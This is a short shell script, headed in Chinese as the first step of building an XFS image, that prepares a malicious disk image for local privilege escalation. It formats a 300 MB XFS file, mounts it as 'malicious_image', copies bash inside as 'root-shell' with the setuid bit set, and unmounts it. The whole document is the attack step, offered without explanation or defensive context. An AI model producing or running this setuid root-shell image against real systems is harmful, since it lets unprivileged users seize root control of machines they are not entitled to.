## 1.构建xfs_image
dd if=/dev/zero of=xfs.image bs=1M count=300

# XFS
sudo mkfs.xfs -f xfs.image

sudo mkdir -p /mnt/malicious_image

sudo mount -t xfs xfs.image /mnt/malicious_image

# SUID Shell
sudo cp /bin/bash /mnt/malicious_image/root-shell
sudo chmod 4755 /mnt/malicious_image/root-shell

sudo umount /mnt/malicious_image
sudo rmdir /mnt/malicious_image

echo "ok"